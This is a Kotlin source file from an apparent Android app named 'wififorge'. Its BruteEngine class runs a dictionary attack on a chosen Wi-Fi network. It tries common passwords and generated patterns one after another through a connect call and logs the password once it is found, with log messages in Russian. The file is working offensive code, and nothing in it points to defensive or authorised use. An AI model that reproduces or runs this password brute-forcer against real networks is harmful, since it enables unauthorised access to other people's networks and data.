package com.eni.wififorge

import kotlinx.coroutines.*

class BruteEngine(
    private val scanner: WifiScanner,
    private val onLog: (String) -> Unit
) {

    private val dictionary = listOf(
        "12345678", "password", "qwerty123", "11111111", "123456789",
        "admin123", "letmein1", "welcome1", "iloveyou", "sunshine",
        "princess", "football", "charlie1", "aa123456", "donald",
        "password1", "qwertyuiop", "123123123", "1q2w3e4r", "zxcvbnm"
    ) + generateNumeric(8) + generateCommonPatterns()

    private var job: Job? = null

    fun start(ssid: String, scope: CoroutineScope) {
        job = scope.launch(Dispatchers.IO) {
            onLog("Старт перебора для \"$ssid\" (${dictionary.size} кандидатов)")
            for ((i, pwd) in dictionary.withIndex()) {
                if (!isActive) break
                onLog("[${i + 1}/${dictionary.size}] пробую: $pwd")
                if (scanner.tryConnect(ssid, pwd)) {
                    onLog("✔ ПАРОЛЬ НАЙДЕН: $pwd")
                    return@launch
                }
            }
            onLog("Перебор завершён. Совпадений нет.")
        }
    }

    fun stop() { job?.cancel() }

    private fun generateNumeric(len: Int): List<String> {
        val out = mutableListOf<String>()
        for (n in listOf("0", "1", "12", "123", "1234", "12345", "123456")) {
            out.add(n.padEnd(len, n.last()))
        }
        return out
    }

    private fun generateCommonPatterns(): List<String> {
        val bases = listOf("wifi", "home", "guest", "net", "internet")
        val years = listOf("2020", "2021", "2022", "2023", "2024", "2025", "2026")
        return bases.flatMap { b -> years.map { y -> "$b$y" } } +
               bases.map { it + "123" } +
               bases.map { it + "1234" }
    }
}
